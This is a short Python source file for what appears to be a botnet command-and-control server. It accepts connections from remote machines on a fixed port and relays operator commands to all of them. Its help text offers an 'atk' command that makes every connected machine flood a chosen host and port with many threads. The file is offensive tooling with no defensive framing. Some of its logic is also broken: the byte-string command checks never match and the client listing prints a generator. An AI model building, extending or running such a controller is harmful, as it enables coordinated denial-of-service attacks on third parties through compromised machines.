import socket
import _thread
ThreadCount = 0
clients = []


def help():
    print(""" Arguments between [] are required; arguments between () are optional.
    atk [host] [port] (threads) -> All machines connected will attack a host in the port that you specify with some threads(default: 100).
    list -> Lists all machines connected.
    print [text] -> Prints some text in all connected machines.
    help -> Displays the help menu.
    """)

def list():
    print(i for i in clients)

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    s.connect(("192.168.0.1", 1))
    ip = s.getsockname()[0]
    return ip


def new_client(connection, address):
    print(f"Connection received from {address[0]}")
    while True:
        command = bytes(input(">>>"), encoding='utf-8')
        if str(command) == "help":
            help()
            
        elif str(command) == "list":
            list()
            
        else:
            for client in clients:
                client.send(b'\r\n' + command)


def listen():
    addr = ("", 57849)
    print(f"IP -> {get_ip()}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(addr)
    s.listen()
    while True:
        conn, address = s.accept()
        clients.append(conn)
        _thread.start_new_thread(new_client, (conn, address))


if __name__ == "__main__":
    listen()
